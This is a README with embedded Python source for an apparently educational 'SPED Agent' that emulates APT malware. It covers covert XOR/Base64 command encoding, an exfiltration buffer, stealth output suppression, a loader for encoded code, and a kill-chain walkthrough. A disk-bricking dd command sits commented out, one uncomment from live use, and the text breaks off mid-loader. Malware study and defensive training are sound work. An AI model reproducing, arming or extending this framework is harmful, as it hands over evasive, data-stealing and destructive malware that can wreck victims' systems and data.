SPED Agent: Simulated Polymorphic Evasion & Destructive APT Agent (Educational & Research)
⚠️ IMPORTANT ETHICAL AND LEGAL DISCLAIMER ⚠️
This repository contains code designed for educational, research, and defensive cybersecurity purposes ONLY.
The "SPED Agent" simulates functionalities commonly found in sophisticated Advanced Persistent Threat (APT) malware, including covert communication, dynamic payload loading, lateral movement, data exfiltration, anti-analysis techniques, and destructive capabilities.
Any attempt to use this code or similar concepts for unauthorized, illegal, or malicious activities (e.g., hacking, compromising systems, data theft, sabotage) is strictly forbidden, highly unethical, and will result in severe legal consequences.
You are solely responsible for your actions.
Always ensure you have explicit, written authorization before conducting any security testing on systems you do not own.
Operate within isolated, controlled environments (like the Google Colab sandbox provided, or dedicated virtual machines/labs) to prevent unintended harm.
By using this code, you agree to abide by all applicable laws and ethical guidelines.
Table of Contents
Introduction: The SPED Agent Concept
Core Features and Their Purpose (Mapped to Attack Phases)
Ethical Considerations: Good vs. Bad Uses
The "Good" (Ethical, Legal, and Responsible Uses)
The "Bad" (Illegal, Unethical, and Highly Risky Uses)
Understanding Attacker Methodology
1. Initial Compromise & Delivery
2. Execution & Persistence
3. Command and Control (C2)
4. Internal Reconnaissance & Lateral Movement
5. Data Exfiltration
6. Evasion & Anti-Analysis
7. Polymorphism & Self-Modification
8. Impact/Sabotage (Optional)
Code Improvements: Original vs. Updated
Safety Assessment of This Repository's Code
How to Run in Google Colab
Project Structure (Simplified)
Full Source Code
1. Introduction: The SPED Agent Concept
The "SPED Agent" (Simulated Polymorphic Evasion & Destructive Agent) is a conceptual Python-based framework designed to emulate the complex behaviors of sophisticated, multi-stage malware, particularly those characteristic of Advanced Persistent Threats (APTs).
Developed within a Google Colab environment, this project demonstrates techniques such as:
Polymorphic code generation for signature evasion.
Covert Command and Control (C2) channels embedded in narrative text.
Dynamic module loading for extensible functionalities (e.g., lateral movement, anti-analysis, destructive payloads).
Simulated lateral movement within a network.
Simulated data exfiltration of internal logs and sensitive information.
Anti-analysis checks to detect and evade security sandboxes.
The primary aim is to provide a hands-on, ethical learning tool for cybersecurity professionals, researchers, and students to understand and develop defenses against modern, evasive cyber threats.
2. Core Features and Their Purpose (Mapped to Attack Phases)
The SPED Agent's modules align with typical phases of a cyber attack:
Stealth & Persistence (main_entry.py, payload_agent.py):
Purpose: To run the agent silently in the background and establish a foothold.
Implementation: main_entry.py redirects stdout and stderr to a NullWriter to prevent console output, ensuring stealth during execution. The payload_agent.py contains the core loop that keeps the agent active.
Covert Command & Control (C2) (shared_context.py, emotional_feedback.py, sped_narrative.py):
Purpose: To receive instructions from the attacker and send data back without easily being detected.
Implementation:
shared_context.py: Provides global covert_command_queue and exfil_data_buffer for inter-module communication.
emotional_feedback.py: Encodes/decodes commands and data into Base64-XOR strings, making them appear as random text.
sped_narrative.py: Simulates embedding these encoded commands directly into narrative text (e.g., social media posts, blog comments), demonstrating a steganographic C2 approach.
Dynamic Module Loading & Execution (modular_loader.py):
Purpose: To extend the agent's capabilities after initial compromise without modifying the core executable, allowing for flexible attack adaptation.
Implementation: Allows the agent to receive Base64-Zlib encoded Python code strings via C2, decompress them, and load them as new modules (load_module_from_code). It can then execute specific functions within these loaded modules (execute_module_command).
Lateral Movement & Reconnaissance (lateral_movement.py - loaded dynamically):
Purpose: To spread from an initially compromised host to other systems within the target network.
Implementation: Simulates network reconnaissance (e.g., finding neighboring IPs via arp -a) and attempts credential reuse (cred_reuse) on newly discovered targets. It updates a network_map in shared_context.
Data Exfiltration (shared_context.py, payload_agent.py):
Purpose: To steal valuable information from the compromised network.
Implementation: shared_context.py maintains an exfil_data_buffer to accumulate logs and simulated stolen data. The exfil_data method in payload_agent.py periodically (or on command) retrieves this buffered data and simulates its transmission back to the attacker (by printing it to stdout with specific markers for extraction in the Colab simulation).
Anti-Analysis & Evasion (anti_analysis.py - loaded dynamically):
Purpose: To detect and evade security researchers, sandboxes, and automated analysis tools.
Implementation: Performs checks for common virtual machine artifacts (filesystem paths, CPU info), suspicious processes (debuggers, sniffers), and uses timing-based anomalies with jitter to detect if it's running in a debugged or emulated environment. Upon detection, it could trigger countermeasures (e.g., self-destruct, dormancy).
Polymorphism & Self-Modification (quantum_forking.py, payload_agent.py):
Purpose: To change the agent's code signature to evade signature-based antivirus and detection systems.
Implementation:
quantum_forking.py: Simulates quantum-based entropy generation (using Qiskit) for robust randomness.
payload_agent.py: Uses this entropy to generate a new version of its own code (generate_polymorphic_payload). This involves XOR obfuscation with a random key and insertion of random "junk code" to alter the binary's appearance. An attacker could use an UPDATE_PAYLOAD command to trigger this self-modification.
Destructive Capabilities (bricking_module.py - loaded dynamically):
Purpose: To cause damage or disrupt systems, often as a final act or in response to detection.
Implementation: Contains a function overwrite_partition that, if uncommented and given root privileges, would use the dd command to overwrite disk partitions with random data, effectively "bricking" the system. (This functionality is explicitly simulated and commented out in the provided code for safety.)
3. Ethical Considerations: Good vs. Bad Uses
The "Good" (Ethical, Legal, and Responsible Uses)
Developing and studying tools like the SPED Agent is vital for defensive cybersecurity, education, and research.
Cybersecurity Research & Development:
Developing New Defenses: Understanding how advanced polymorphic malware, covert C2, and anti-analysis techniques work is crucial for developing new detection methods, improving Endpoint Detection and Response (EDR) solutions, and refining network security measures.
Threat Intelligence: Enhancing the understanding and interpretation of real-world APT threat intelligence reports.
Controlled Penetration Testing & Red Teaming (with Authorization):
Strengthening Defenses: Simulating sophisticated attacks against an organization's own infrastructure (with explicit, written permission) to identify vulnerabilities and test the effectiveness of security controls and incident response capabilities.
Blue Team Training: Providing realistic scenarios for defensive security teams to detect, analyze, and respond to advanced, stealthy threats.
Security Education & Training:
Hands-on Learning: Offering practical experience in understanding malware functionality, reverse engineering, and advanced defensive strategies in a safe, isolated environment.
Honeypot & Deception Technology: Deploying simulated agents in honeypots to lure and analyze real-world threat actors' interaction patterns.
The "Bad" (Illegal, Unethical, and Highly Risky Uses)
Any use of this code, or similar code, for purposes other than the "good" ones listed above is considered malicious, illegal, and highly unethical.
Unauthorized Access & Exploitation: Gaining access to computer systems, networks, or data without explicit permission. This is a severe felony in most jurisdictions.
Malware Deployment & Distribution: Creating or distributing actual malware based on this code or its principles, or infecting target systems.
Data Theft & Espionage: Using exfiltration capabilities to steal sensitive information (personal data, financial records, intellectual property, government secrets).
Sabotage & Destruction: Activating destructive modules to damage, wipe, or disable computer systems or data.
Ransomware & Extortion: Encrypting data on target systems and demanding payment.
The legal consequences for these actions are severe, including significant prison time and substantial fines.
4. Understanding Attacker Methodology
Here's how an attacker would leverage the functionalities of the SPED Agent within a typical cyberattack kill chain:
1. Initial Compromise & Delivery
Attacker Action: The attacker's first step is to get the compiled SPED Agent executable (main_entry) onto the target system. This typically involves social engineering (e.g., phishing emails with malicious attachments or links), exploiting unpatched software vulnerabilities, or leveraging supply chain weaknesses.
SPED Agent Role: The compiled main_entry executable is the final payload delivered in this initial phase.
2. Execution & Persistence
Attacker Action: Once delivered, the attacker needs the agent to run and survive system reboots. The victim might be tricked into executing the agent (e.g., disguised as a benign document or application). The attacker would then establish persistence mechanisms (e.g., modifying startup entries, creating scheduled tasks, or installing fake services) to ensure the agent automatically restarts whenever the system boots.
SPED Agent Role: The agent's main_entry.py (which launches payload_agent.py) immediately suppresses console output using NullWriter for stealth. The payload_agent.py contains the core operational loop (run_main_loop) that keeps the agent active.
3. Command and Control (C2)
Attacker Action: The attacker needs a covert way to issue commands to the deployed agent and receive exfiltrated data. Traditional C2 channels are often blocked by firewalls.
SPED Agent Role:
Covert Channels: emotional_feedback.py and sped_narrative.py demonstrate how commands (e.g., [cmd:BASE64_ENCODED_CMD]) and exfiltrated data ([data_chunk_X:BASE64_ENCODED_DATA]) can be embedded within seemingly harmless text. This could represent data hidden in social media posts, public forum comments, or even legitimate but obscure network protocols.
Communication Flow: The shared_context.py acts as a central hub, using thread-safe queues and buffers (covert_command_queue, exfil_data_buffer) for agents to communicate internally or for parsed C2 data.
4. Internal Reconnaissance & Lateral Movement
Attacker Action: After gaining an initial foothold, the attacker wants to understand the network's layout, identify valuable assets, and spread to other systems to expand their control or find the ultimate target.
SPED Agent Role: The lateral_movement.py module (loaded dynamically via a C2 command) simulates:
Network Discovery: Using commands like arp -a or ip neighbor show to map neighboring machines.
Credential Reuse: Attempting to authenticate to newly discovered systems using credentials stolen from the initial host, or commonly known default credentials.
Pivoting: If authentication is successful, the agent marks the new system as compromised in its internal network_map and recursively attempts to discover and compromise its neighbors, moving deeper into the network.
5. Data Exfiltration
Attacker Action: The core objective for many APTs is to steal sensitive data.
SPED Agent Role:
Data Staging: The agent would identify valuable data (e.g., documents, databases, proprietary code) and prepare it for exfiltration. Simulated logs from the agent's internal operations (log_internal) are also added to the buffer.
Covert Transmission: The shared_context.py module aggregates these data chunks in exfil_data_buffer. The exfil_data() method in payload_agent.py periodically (or when commanded via C2: EXFIL_DATA_NOW) retrieves the data and simulates its transmission out of the network via the same covert channels used for C2.
6. Evasion & Anti-Analysis
Attacker Action: Attackers constantly strive to avoid detection by security software (antivirus, EDR) and human analysts (forensicators, incident responders).
SPED Agent Role: The anti_analysis.py module (loaded dynamically) is crucial here:
Environment Checks: It performs checks for common indicators of virtual machines, sandboxes, and debugging tools (e.g., specific file paths, running processes like Wireshark or debuggers, CPU information like "VMware" strings).
Timing Anomalies: It employs sophisticated timing checks with jitter. Debuggers and emulators often alter the timing of operations, and the agent uses this deviation (compared to a baseline) to detect if it's being analyzed.
Countermeasures: If an analysis environment is detected, the agent could initiate countermeasures such as self-destruction, going dormant for extended periods, or sending decoy data to mislead analysts.
7. Polymorphism & Self-Modification
Attacker Action: To defeat signature-based detection, attackers want their malware's binary signature to constantly change.
SPED Agent Role: The payload_agent.py's polymorphic capabilities are key:
Code Obfuscation: The agent can take its own source code (or an updated version received via C2) and apply XOR obfuscation with a randomly generated key.
Junk Code Insertion: Random "junk code" (e.g., # Void of no-operation) is inserted into the obfuscated binary.
Self-Update: The attacker could issue an UPDATE_PAYLOAD command via C2, triggering the agent to generate a new polymorphic variant of itself. In a real attack, this new variant would then replace the old one on disk and restart, presenting a fresh signature to security products.
Entropy Source: quantum_forking.py provides a simulated high-quality entropy source (using Qiskit) to ensure the randomness of keys and junk insertion, making it harder for reverse engineers to predict patterns.
8. Impact/Sabotage (Optional)
Attacker Action: In some scenarios (e.g., nation-state attacks, destructive ransomware), the goal is to cause damage or disruption rather than just theft.
SPED Agent Role: The bricking_module.py demonstrates this. If loaded and commanded via C2 (e.g., BRICK /dev/sda1), it would (if uncommented and given privileges) use the dd command to overwrite specified disk partitions, rendering the system unusable. (This part is simulated/commented out for safety in this repository.)
5. Code Improvements: Original vs. Updated
The "updated" version of the SPED Agent incorporates several key improvements based on detailed code analysis, primarily focusing on robustness, ethical security simulation, and Python best practices.
Here's a breakdown of the differences:
Import and Dependency Management (!pip install):
Original: Used !pip install pyinstaller qiskit textblob --quiet.
Updated: No Change. This remains the same. While !pip is a Jupyter/Colab-specific magic command, it is the intended and idiomatic way to manage dependencies within a Google Colab notebook, making it appropriate and user-friendly for this specific environment.
File Path Handling (BUILD_DIR):
Original: BUILD_DIR = "sped_agent_build"
Updated: Changed to BUILD_DIR = os.path.abspath("sped_agent_build").
Difference: This ensures that the BUILD_DIR is always resolved to an absolute path. While less critical in Colab's consistent environment, it's a good practice for general Python script robustness and portability, preventing issues if the script were run from different working directories.
Resource Cleanup (self_destruct in payload_agent.py):
Original: The self_destruct method primarily set self.agent_active = False and exited immediately.
Updated: Enhanced self_destruct to attempt a graceful shutdown of background threads. It now iterates through shared_context.background_threads and calls thread.join(timeout=1.0) for each active thread.
Difference: This improves the agent's graceful termination. While Python daemon threads usually exit with the main process, attempting a join with a timeout allows them a chance to complete any critical tasks before the process terminates, which is a better practice for programs involving concurrency.
Exception Handling (in modular_loader.py):
Original: Used broad except Exception as e: blocks for error handling, which can obscure the root cause of issues.
Updated: Refined exception handling to catch more specific errors during module loading and execution (e.g., base64.binascii.Error, zlib.error, UnicodeDecodeError, SyntaxError for loading; ImportError for module not found). The general except Exception is retained as a fallback, but it now also logs the full traceback using import traceback; traceback.format_exc() for more detailed debugging information.
Difference: Significantly improves the diagnostic capabilities. More specific error messages and full tracebacks make it much easier to identify and debug issues within the dynamically loaded modules or during their execution.
Thread Safety (for exfil_data_buffer in shared_context.py):
Original: The exfil_data_buffer list was a shared global resource accessed directly by multiple threads without explicit synchronization.
Updated: Introduced a threading.Lock() named exfil_buffer_lock. All read and write operations on exfil_data_buffer (in add_exfil_data_chunk and retrieve_exfil_data) are now protected by this lock using with exfil_buffer_lock:.
Difference: This is a critical improvement for concurrency. Without a lock, multiple threads accessing the shared buffer simultaneously could lead to race conditions, data corruption, or unpredictable behavior. The lock ensures atomicity for buffer operations, making the agent's internal data handling robust and thread-safe.
Security Issues (in anti_analysis.py):
Original: Included basic timing checks (if (t1 - t0) > 0.5:).
Updated: Enhanced the timing-based anti-analysis check significantly. It now incorporates a _measure_execution_time helper function, measures a baseline_sleep_duration, introduces a jitter (random delay) to the actual sleep, and then compares the actual_sleep_duration to the baseline with a more flexible threshold (e.g., actual_sleep_duration > (baseline_sleep_duration * 5)).
Difference: The simulated anti-analysis capability is more sophisticated and realistic. Simple, fixed timing checks are easily bypassed by emulators. By introducing a baseline and jitter, the detection becomes more robust and harder for a simulated "debugger" to evade, reflecting more advanced evasion techniques used by real malware.
Cross-Platform Compatibility (for executable_path):
Original: executable_path = "./dist/main_entry"
Updated: Changed to executable_path = os.path.join("dist", "main_entry"). (The existing if sys.platform == "win32": executable_path += ".exe" logic was retained).
Difference: Using os.path.join is the standard, platform-agnostic way to construct file paths in Python. This improves general code cleanliness and ensures correct path separators (/ on Unix-like, \ on Windows) are used regardless of the operating system.
Memory Management:
Original: No explicit memory monitoring or cleanup functions were present.
Updated: No Change. While important for long-running, production-grade agents, implementing robust, cross-platform Python-level memory monitoring and active cleanup (beyond automatic garbage collection) adds significant complexity and often requires platform-specific libraries or deeper system calls. For this conceptual and educational simulation, explicit manual memory management functions were not implemented, but it remains a valid consideration for real-world high-performance systems.
6. Safety Assessment of This Repository's Code
The code provided in this repository has been designed with safety in mind for an educational and simulated environment.
Isolated Execution: The primary method for running this code (Google Colab) provides a sandboxed environment, isolating the execution from your local machine and Google's infrastructure.
Simulated Destructive Actions: All potentially destructive functionalities, such as the bricking_module's overwrite_partition function, are either:
Explicitly commented out: The line os.remove(exe_path) in self_destruct is commented.
Simulated: The run_command in lateral_movement does not execute actual system commands remotely but returns a simulated success message. The "exfiltration" simply prints data to the Colab output.
No Actual Network Connections: The agent does not establish outbound network connections to external C2 servers or other hosts. All "communication" and "exfiltration" are simulated within the console output of the Colab environment.
Ethical Warnings: This README.md and comments within the code itself include prominent warnings about responsible and ethical use.
Therefore, running this code within the Google Colab environment as intended is generally safe for learning and experimentation. However, it is crucial to reiterate:
DO NOT run this code on any system you do not own or have explicit authorization for.
DO NOT uncomment or modify code segments to enable real destructive or network-active behaviors without understanding the full implications and having proper authorization and isolated lab environments.
DO NOT distribute compiled versions of this code for malicious purposes.
7. How to Run in Google Colab
This project is designed to run seamlessly in Google Colaboratory.
Open Google Colab: Go to https://colab.research.google.com/.
Create a New Notebook: Click File > New notebook.
Copy the Code: Copy the entire content from the "Full Source Code" section below.
Paste into Colab: Paste the copied code into the first cell of your new Colab notebook.
Run the Cell: Click the "Play" button (▶) next to the cell, or press Shift + Enter.
The script will:
Uninstall any old pathlib versions (a PyInstaller requirement).
Install necessary Python dependencies (pyinstaller, qiskit, textblob).
Write the agent's Python modules to a temporary build directory.
Use PyInstaller to compile the agent into a standalone executable (main_entry).
Simulate the execution of the compiled agent by running it in a subprocess for a short duration.
Capture and parse the simulated output, including internal logs and exfiltrated data.
You will see the output of the PyInstaller build process and then the simulated logs from the running SPED Agent.
8. Project Structure (Simplified)
While all code is contained within a single Colab script for ease of use, logically, the project comprises:



SPED_Agent_Project/
├── README.md                      (This file)
├── Colab_SPED_Agent_Builder.ipynb (The conceptual Jupyter/Colab Notebook equivalent)
├── sped_agent_build/              (Temporary directory created by the script during build)
│   ├── main_entry.py              (Agent's entry point for PyInstaller)
│   ├── payload_agent.py           (Core agent logic, C2 handler, polymorphism)
│   ├── shared_context.py          (Global state, queues, buffers, logging)
│   ├── emotional_feedback.py      (Sentiment analysis, covert message encoding/decoding)
│   ├── sped_narrative.py          (Dynamic narrative, covert command embedding)
│   ├── quantum_forking.py         (Entropy source for polymorphism)
│   ├── modular_loader.py          (Dynamic module loading/unloading)
│   ├── lateral_movement.py        (Dynamically loaded payload: recon, cred reuse, pivot)
│   ├── anti_analysis.py           (Dynamically loaded payload: sandbox/debugger evasion)
│   └── bricking_module.py         (Dynamically loaded payload: destructive actions - SIMULATED)
├── dist/                          (PyInstaller output directory)
│   └── main_entry                 (The compiled standalone agent executable)
└── build/                         (PyInstaller temporary working directory)


9. Full Source Code

Python


# ==============================================================================
# SPED AGENT BUILDER: COSMIC FORGE - Google Colaboratory Script
# This script defines the entire SPED agent and packages it into a standalone executable.
# Target OS for the executable: Linux (Colab's environment).
# For Windows/Cross-compilation, additional setup (e.g., Wine/MinGW) would be required.
# ==============================================================================

import os
import subprocess
import base64
import zlib
import sys
import queue
import threading
import time
import importlib.util
import re
import hashlib
import random
import shutil # For cleaning up temporary directory

print("PHASE 0: Initializing Cosmic Forge Environment...")

# Uninstall the problematic 'pathlib' backport if it exists, as recommended by PyInstaller.
# This ensures compatibility with PyInstaller by removing the obsolete package.
print("Attempting to uninstall obsolete 'pathlib' package if present...")
try:
    subprocess.run([sys.executable, "-m", "pip", "uninstall", "pathlib", "-y"], check=True, capture_output=True, text=True)
    print("Obsolete 'pathlib' package uninstalled successfully (if it was present).")
except subprocess.CalledProcessError as e:
    # This might fail if pathlib isn't installed or due to permissions, which is fine
    print(f"Failed to uninstall 'pathlib' (might not be installed or other error): {e.stderr.strip()}")
except Exception as e:
    print(f"An unexpected error occurred during 'pathlib' uninstall: {e}")


# Install PyInstaller for creating the standalone executable
# Suppress output to keep the console clean
# Note: Using !pip install is standard in Colab notebooks.
!pip install pyinstaller qiskit textblob --quiet

print("Dependencies installed and modules imported.")

# --- Placeholder for external files, if they were to be loaded from disk ---
# For a self-contained app, we embed all code as strings.
# If you had actual files, this is where they'd be loaded.

# ------------------------------------------------------------------------------
# PHASE 1: Define SPED Agent Modules (Embedded as Strings)
# ------------------------------------------------------------------------------

# quantum_forking.py
# Provides a source of entropy for polymorphic code generation and simulates quantum-based decision-making.
QUANTUM_FORKING_CODE = """
from qiskit import QuantumCircuit, Aer, execute
import random
import shared_context # Import the shared context module for logging

def quantum_fork_decision():
    \"\"\"
    Simulates a quantum-forking decision.
    Attempts to use Qiskit for a true quantum-random bit,
    falls back to Python's random if Qiskit fails or is unavailable.
    \"\"\"
    try:
        circuit = QuantumCircuit(1, 1)
        circuit.h(0) # Apply Hadamard gate to create superposition
        circuit.measure(0, 0) # Measure the qubit
        simulator = Aer.get_backend('qasm_simulator')
        result = execute(circuit, simulator, shots=1).result()
        counts = result.get_counts()
        decision = "branch1" if "1" in counts else "branch2"
        shared_context.log_internal(f"QuantumFork: Decision: {decision}")
        return decision
    except Exception as e:
        shared_context.log_internal(f"QuantumFork: Qiskit error, falling back to random choice: {e}")
        # Fallback for environments without Qiskit or quantum hardware access
        return random.choice(["branch1", "branch2"])

def quantum_fork_decision_for_seed():
    \"\"\"
    Simulates a quantum-random bit (0 or 1) for use as an entropy source.
    Falls back to Python's random if Qiskit is not available.
    \"\"\"
    try:
        circuit = QuantumCircuit(1, 1)
        circuit.h(0)
        circuit.measure(0, 0)
        simulator = Aer.get_backend('qasm_simulator')
        result = execute(circuit, simulator, shots=1).result()
        counts = result.get_counts()
        return int("1" in counts) # Return 0 or 1
    except Exception as e:
        shared_context.log_internal(f"QuantumFork: Qiskit seed error, falling back to random bit: {e}")
        return random.randint(0, 1) # Fallback for non-quantum environments
"""

# emotional_feedback.py
# Analyzes text sentiment and can embed/extract covert commands and exfiltration data.
EMOTIONAL_FEEDBACK_CODE = """
from textblob import TextBlob
import re
import base64
import shared_context # Import the shared context module for logging

def encode_covert_message(message):
    \"\"\"
    Encodes a message using a simple XOR cipher and Base64.
    Used for embedding covert commands.
    \"\"\"
    key = 0x42 # Simple XOR key
    encoded = bytearray()
    for b in message.encode('utf-8'):
        encoded.append(b ^ key)
    return base64.b64encode(encoded).decode('utf-8')

def decode_covert_message(encoded_msg_part):
    \"\"\"
    Decodes a Base64 and XOR-encoded message.
    Handles optional "CMD:" prefix.
    \"\"\"
    # The actual encoded message might be prefixed (e.g., "CMD:"). Remove if present.
    if encoded_msg_part.startswith("CMD:"):
        encoded_msg_part = encoded_msg_part[4:]
    decoded_bytes = base64.b64decode(encoded_msg_part)
    key = 0x42
    decoded = bytearray()
    for b in decoded_bytes:
        decoded.append(b ^ key)
    return decoded.decode('utf-8')

def decode_data_chunk(encoded_chunk_part):
    \"\"\"
    Extracts and decodes a Base64 encoded data chunk from a formatted string.
    Example format: [data_chunk_X:BASE64DATA].
    \"\"\"
    match = re.search(r'\\[data_chunk_\\d+:(.*?)\\]', encoded_chunk_part)
    if match:
        encoded_data = match.group(1)
        try:
            return base64.b64decode(encoded_data).decode('utf-8')
        except Exception as e:
            shared_context.log_internal(f"EmotionalFeedback: Error decoding data chunk: {e}")
            pass
    return None

def embed_covert_command(emotional_state, command):
    \"\"\"
    Embeds a covert command into an emotional state string.
    \"\"\"
    encoded = encode_covert_message("CMD:" + command)
    return f"{emotional_state} [cmd:{encoded}]"

def analyze_emotion(text):
    \"\"\"
    Analyzes the sentiment of the given text and returns a simple emotional state.
    \"\"\"
    blob = TextBlob(text)
    sentiment = blob.sentiment.polarity

    if sentiment > 0.1:
        emotion_str = "happy"
    elif sentiment < -0.1:
        emotion_str = "sad"
    else:
        emotion_str = "neutral"

    # The actual text with embedded commands will be passed separately for extraction.
    return emotion_str
"""

# sped_narrative.py
# Adapts a dynamic story based on user input or emotional states, also capable of embedding covert command triggers.
SPED_NARRATIVE_CODE = """
import random
import re
import base64
import time
import shared_context # Import the shared context module
from emotional_feedback import encode_covert_message # Import encoding from emotional_feedback

class SPEDNarrative:
    \"\"\"
    Manages a dynamic narrative that adapts based on user input or emotional cues.
    Can also randomly embed covert commands into the narrative.
    \"\"\"
    def __init__(self, story_start):
        self.story = story_start
        self.history = [story_start]
        shared_context.log_internal("SPEDNarrative: Initialized.")

    def adapt_narrative(self, user_input_or_emotion):
        \"\"\"
        Adapts the ongoing story based on the provided user input or emotion string.
        \"\"\"
        if "happy" in user_input_or_emotion:
            self.story += " The character smiles and feels hopeful."
        elif "sad" in user_input_or_emotion:
            self.story += " The character looks down, burdened by sadness."
        elif "angry" in user_input_or_emotion:
            self.story += " The character clenches their fists in frustration."
        else:
            self.story += " The character pauses, lost in thought."

        # Embed covert command trigger based on certain conditions
        if self.should_trigger_covert():
            command = "EXECUTE_PAYLOAD" # Placeholder command, actual commands from C2
            encoded_cmd = encode_covert_message("CMD:" + command)
            self.story += f" [cmd:{encoded_cmd}]" # Embed into the narrative response
            shared_context.log_internal(f"SPEDNarrative: Embedded covert command '{command}' into narrative.")

        self.history.append(self.story)
        return self.story

    def should_trigger_covert(self):
        \"\"\"
        Determines if a covert command should be embedded (e.g., based on random chance).
        \"\"\"
        return random.random() < 0.05  # 5% chance to embed a command

    def get_history(self):
        \"\"\"Returns the full narrative history.\"\"\"
        return self.history
"""

# Shared_Context.py
# A central module defining global variables and functions for inter-module communication, logging, and data exfiltration.
SHARED_CONTEXT_CODE = """
import queue
import threading
import time
import base64

# --- Shared Channels (global scope) ---
# Queue for covert commands received by the agent.
covert_command_queue = queue.Queue()
# Buffer for data chunks awaiting exfiltration.
exfil_data_buffer = []
exfil_buffer_lock = threading.Lock() # ADDED: Lock for thread safety

# List to keep track of background threads initiated by modules.
background_threads = []
# Global dictionary to store the discovered and compromised network map.
network_map = {}
# Global variable to hold the currently active polymorphic payload code for self-modification.
current_polymorphic_payload_code = None

# --- Interaction Functions ---
def set_covert_command(cmd):
    \"\"\"Adds a command to the covert command queue.\"\"\"
    try:
        covert_command_queue.put_nowait(cmd)
    except queue.Full:
        pass # Queue full, drop command silently

def get_covert_command():
    \"\"\"Retrieves a command from the covert command queue.\"\"\"
    try:
        return covert_command_queue.get_nowait()
    except queue.Empty:
        return None

def add_exfil_data_chunk(chunk):
    \"\"\"Adds a chunk of data to the exfiltration buffer.\"\"\"
    with exfil_buffer_lock: # ADDED: Acquire lock for thread safety
        try:
            # Assuming chunks are already base64 encoded by the source
            exfil_data_buffer.append(chunk)
        except Exception:
            pass # Silently drop malformed chunks

def retrieve_exfil_data():
    \"\"\"Retrieves all data from the exfiltration buffer and clears it.\"\"\"
    with exfil_buffer_lock: # ADDED: Acquire lock for thread safety
        if not exfil_data_buffer:
            return None
        assembled = ''.join(exfil_data_buffer)
        exfil_data_buffer.clear() # Clear buffer after retrieval
        return assembled

def log_internal(message):
    \"\"\"
    Logs an internal message by encoding it and adding it to the exfiltration buffer.
    This provides a stealthy logging mechanism without writing to stdout/stderr directly.
    \"\"\"
    try:
        timestamp = int(time.time())
        safe_message = str(message)
        # Base64 encode the log message before adding to exfil buffer
        encoded_log = base64.b64encode(f"LOG:{timestamp}:{safe_message}".encode('utf-8', errors='ignore')).decode('utf-8')
        add_exfil_data_chunk(encoded_log)
    except Exception:
        pass # Silently fail if logging itself causes issues

def start_background_task(target_func, *args, **kwargs):
    \"\"\"Starts a function in a new daemon thread and tracks it.\"\"\"
    try:
        thread = threading.Thread(target=target_func, args=args, kwargs=kwargs, daemon=True)
        thread.start()
        background_threads.append(thread)
        log_internal(f"ThreadMgr: Started thread for {target_func.__name__}")
        return thread
    except Exception as e:
            log_internal(f"ThreadMgr: Error starting thread for {target_func.__name__}: {e}")
            return None
"""

# Bricking Module
# A destructive payload capable of overwriting disk partitions, intended for self-destruction or target system compromise.
BRICKING_MODULE_CODE = """
import subprocess
import os
import sys
import base64
import time
import shared_context # Import the shared context module

# NullWriter class defined locally for self-containment
class NullWriter:
    def write(self, s):
        pass

# Redirect stdout and stderr to null for stealthy operation
_original_stdout = sys.stdout
_original_stderr = sys.stderr
sys.stdout = NullWriter()
sys.stderr = NullWriter()

def overwrite_partition(device_path, data_source="/dev/urandom", block_size=4096, count=1000, verify_write=False):
    \"\"\"
    Overwrites a specified device partition with random data for bricking.
    This operation is EXTREMELY DESTRUCTIVE and IRREVERSIBLE.
    It requires root/administrator privileges.

    Args:
        device_path (str): The path to the target partition (e.g., "/dev/block/by-name/bootloader" on Linux/Android).
        data_source (str): Source of data to write (e.g., "/dev/urandom" for random, "/dev/zero" for zeros).
        block_size (int): Block size for dd command (bytes).
        count (int): Number of blocks to write.
        verify_write (bool): If True, attempts a small write test before the main operation.
    
    Returns:
        bool: True if the operation was attempted without immediate error, False otherwise.
              A True return does not guarantee a successful brick, only successful execution of dd.
    \"\"\"
    
    shared_context.log_internal(f"Bricking: Attempting overwrite on {device_path}")

    if os.name == 'posix':
        if os.geteuid() != 0:
            shared_context.log_internal("Bricking: Not root - insufficient privileges.")
            return False
    elif os.name == 'nt':
        shared_context.log_internal("Bricking: Windows detected, dd not standard for this purpose.")
        return False

    if not os.path.exists(device_path):
        shared_context.log_internal(f"Bricking: Target path {device_path} does not exist.")
        return False

    if verify_write:
        test_file = f"{device_path}_test_write_{os.getpid()}"
        try:
            with open(test_file, "wb") as f:
                f.write(os.urandom(1))
            os.remove(test_file)
            shared_context.log_internal("Bricking: Write permission test passed.")
        except PermissionError:
            shared_context.log_internal("Bricking: Write permission test failed.")
            return False
        except Exception as e:
            shared_context.log_internal(f"Bricking: Unexpected error during write test: {e}")
            pass

    try:
        # THIS IS THE DESTRUCTIVE COMMAND. IT IS SIMULATED FOR SAFETY.
        # TO ACTUALLY OVERWRITE A DEVICE, UNCOMMENT THE LINE BELOW.
        # DANGER: THIS WILL DESTROY DATA ON THE SPECIFIED DEVICE.
        # command = ["dd", f"if={data_source}", f"of={device_path}", f"bs={block_size}", f"count={count}"]
        # with open(os.devnull, 'w') as FNULL:
        #     subprocess.run(command, stderr=FNULL, stdout=FNULL, check=True)
        shared_context.log_internal(f"Bricking: SIMULATED dd command executed for {device_path}.")
        return True
    except subprocess.CalledProcessError as e:
        shared_context.log_internal(f"Bricking: dd command failed for {device_path}. Error: {e.stderr.strip()}")
        return False
    except Exception as e:
        shared_context.log_internal(f"Bricking: Unexpected error during dd execution: {e}")
        return False

# Restore original stdout/stderr after the module is defined, before main execution
sys.stdout = _original_stdout
sys.stderr = _original_stderr
"""

# Modular Loader
# Enables the agent to dynamically load and unload additional modules (payloads) from encoded strings.
MODULAR_LOADER_CODE = """
import importlib.util
import base64
import zlib
import sys
import shared_context # Import the shared context module
import subprocess # Needed for injection into module scope
import os # Needed for injection into module scope
import time # Needed for injection into module scope
import queue # Needed for injection into module scope
import threading # Needed for injection into module scope
import re # Needed for injection into module scope
import random # Needed for injection into module scope
import hashlib # Needed for injection into module scope
import traceback # For detailed exception logging

loaded_modules = {} # Dictionary to keep track of dynamically loaded modules

def load_module_from_code(module_name, encoded_code):
    \"\"\"
    Loads a Python module from its Base64 and Zlib encoded string representation.
    Injects shared context and common modules into the loaded module's global scope.
    \"\"\"
    if module_name in loaded_modules:
        shared_context.log_internal(f"ModuleLoad: Module '{module_name}' already loaded.")
        return False
    try:
        # Decode and decompress the module code
        module_code = zlib.decompress(base64.b64decode(encoded_code)).decode('utf-8')
        
        # Create a module spec and module object
        spec = importlib.util.spec_from_loader(module_name, loader=None)
        module = importlib.util.module_from_spec(spec)
        
        # Inject shared context and common modules into the dynamically loaded module's global scope.
        # This allows the loaded module to interact with the agent's core functionalities.
